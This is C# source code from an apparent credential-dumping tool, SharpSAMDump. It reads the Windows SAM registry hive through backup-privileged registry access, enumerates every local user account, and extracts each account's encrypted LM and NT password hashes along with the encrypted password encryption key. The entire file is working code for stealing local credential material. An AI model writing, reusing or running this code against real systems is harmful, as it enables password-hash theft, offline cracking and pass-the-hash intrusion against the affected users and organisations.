using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpSAMDump
{
    public class SAMEntry
    {
        [StructLayout(LayoutKind.Explicit)]
        private struct Header
        {
            public static int DataOffset = 0xcc;

            [FieldOffset(0x0c)]
            internal int AccountNameOffset;
            [FieldOffset(0x10)]
            internal int AccountNameLength;
            [FieldOffset(0x18)]
            internal int CompleteAccountNameOffset;
            [FieldOffset(0x1c)]
            internal int CompleteAccountNameLength;
            [FieldOffset(0x24)]
            internal int CommentOffset;
            [FieldOffset(0x28)]
            internal int CommentLength;
            [FieldOffset(0x48)]
            internal int HomeDirOffset;
            [FieldOffset(0x4c)]
            internal int HomeDirLength;
            [FieldOffset(0x60)]
            internal int ScriptPathOffset;
            [FieldOffset(0x64)]
            internal int ScriptPathLength;
            [FieldOffset(0x9c)]
            internal int LMHashOffset;
            [FieldOffset(0xa0)]
            internal int LMHashLength;
            [FieldOffset(0xa8)]
            internal int NTHashOffset;
            [FieldOffset(0xac)]
            internal int NTHashLength;
            [FieldOffset(0xc4)]
            internal int HashHistoryCount;
        }

        public readonly uint Rid;

        private Header _Header;
        private byte[] _Data;

        public SAMEntry(uint rid, byte[] data)
        {
            Rid = rid;

            unsafe
            {
                fixed (byte* pdata = &data[0])
                {
                    _Header = Marshal.PtrToStructure<Header>(new IntPtr(pdata));
                }
            }

            int dataLength = data.Length - Header.DataOffset;
            if (dataLength > 0)
            {
                _Data = new byte[dataLength];
                Array.Copy(data, Header.DataOffset, _Data, 0, dataLength);
            }
        }

        public string AccountName
        {
            get => Encoding.Unicode.GetString(_Data, _Header.AccountNameOffset, _Header.AccountNameLength);
        }

        public string FullAccountName
        {
            get => Encoding.Unicode.GetString(_Data, _Header.CompleteAccountNameOffset, _Header.CompleteAccountNameLength);
        }

        public string Comment
        {
            get => Encoding.Unicode.GetString(_Data, _Header.CommentOffset, _Header.CommentLength);
        }

        public string HomeDirectory
        {
            get => Encoding.Unicode.GetString(_Data, _Header.HomeDirOffset, _Header.HomeDirLength);
        }
        public string ScriptPath
        {
            get => Encoding.Unicode.GetString(_Data, _Header.ScriptPathOffset, _Header.ScriptPathLength);
        }

        public byte[] EncryptedLMHash
        {
            get
            {
                byte[] lmHash = new byte[_Header.LMHashLength];
                Array.Copy(_Data, _Header.LMHashOffset, lmHash, 0, _Header.LMHashLength);
                return lmHash;
            }
        }

        public byte[] EncryptedNTHash
        {
            get
            {
                byte[] ntHash = new byte[_Header.NTHashLength];
                Array.Copy(_Data, _Header.NTHashOffset, ntHash, 0, _Header.NTHashLength);
                return ntHash;
            }
        }
    }

    public static class SAM
    { 
        public static SAMEntry GetEntry(uint rid)
        {
            using (RegistryKey userKey = Registry.LocalMachine.OpenSubKeyForBackup($"SAM\\SAM\\Domains\\Account\\Users\\{rid:X8}"))
            {
                byte[] data = (byte[])userKey.GetValue("V");
                return new SAMEntry(rid, data);
            }
        }

        public static SAMEntry[] GetEntries()
        {
            List<SAMEntry> entries = new List<SAMEntry>();

            using (RegistryKey usersKey = Registry.LocalMachine.OpenSubKeyForBackup($"SAM\\SAM\\Domains\\Account\\Users"))
            {
                string[] subkeys = usersKey.GetSubKeyNames();
                foreach (string subkey in subkeys)
                {
                    if (subkey == "Names")
                    {
                        continue;
                    }

                    uint rid = Convert.ToUInt32(subkey, 16);

                    try
                    {
                        using (RegistryKey userKey = usersKey.OpenSubKeyForBackup(subkey))
                        {
                            byte[] data = (byte[])userKey.GetValue("V");
                            // Console.WriteLine($"User: {rid}\n{Util.ToHexString(data)}");
                            entries.Add(new SAMEntry(rid, data));
                        }
                    } catch (Win32Exception)
                    {
                        continue;
                    }
                }
            }

            return entries.ToArray();
        }

        public static byte[] GetEncryptedPasswordEncryptionKey()
        {
            using (RegistryKey userKey = Registry.LocalMachine.OpenSubKeyForBackup($"SAM\\SAM\\Domains\\Account"))
            {
                return (byte[])userKey.GetValue("F");
            }
        }
    }
}
